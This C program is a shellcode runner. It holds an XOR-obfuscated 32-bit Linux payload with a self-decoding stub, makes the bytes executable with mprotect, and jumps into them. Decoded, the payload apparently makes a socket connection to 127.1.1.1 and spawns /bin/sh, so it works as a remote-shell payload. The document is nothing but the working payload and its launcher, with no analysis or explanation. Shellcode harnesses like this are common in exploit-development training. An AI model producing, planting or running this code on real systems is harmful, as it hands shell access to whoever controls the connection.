#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
unsigned char shellcode[] = \
"\xeb\x11\x5e\x31\xc9\xb1\x4a\x80\x74\x0e\xff\x0a\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x60\x6c\x52\x60\x0b\x51\x3b\xd8\x58\x59\x60\x08\x83\xeb\xc7\x8a\x98\xba\x6c\x62\x75\x0b\x0b\x0b\x6c\x62\x0f\x33\x49\x6c\x59\x83\xeb\x60\x1a\x5b\x58\x83\xeb\x49\xc7\x8a\x60\x08\x53\x8d\xd0\xba\x35\xc7\x8a\x43\x73\xf3\xba\x01\x4b\x83\xc0\x58\x62\x25\x25\x79\x62\x62\x25\x68\x63\x64\x83\xe9\xc7\x8a";
int main(){
  printf("Shellcode length: %d\n", strlen(shellcode));
  int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())shellcode;
  return ret();
}
